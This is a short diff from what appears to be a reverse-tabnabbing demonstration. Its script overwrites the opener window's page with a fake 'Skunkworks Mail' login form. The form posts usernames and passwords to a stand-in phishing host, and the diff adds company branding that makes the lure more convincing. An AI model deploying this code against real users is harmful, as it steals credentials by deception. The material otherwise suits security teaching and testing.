@@ -86,7 +86,10 @@
                 // Or manipulate the opener's DOM to display a fake login prompt
                 window.opener.document.body.innerHTML = `
                     <div class="container">
-                        <h1>Fake Login</h1>
+                        <header class="header">
+                            <img src="https://github.com/skunkworksza/Media/blob/main/skunkworks-logo%20-%20Copy.png?raw=true" alt="Skunkworks Logo" class="logo">
+                            <h1>Fake Skunkworks Mail Login</h1>
+                        </header>
                         <form action="https://phishing-site.com/login" method="POST">
                             <input type="text" name="username" placeholder="Username">
                             <input type="password" name="password" placeholder="Password">
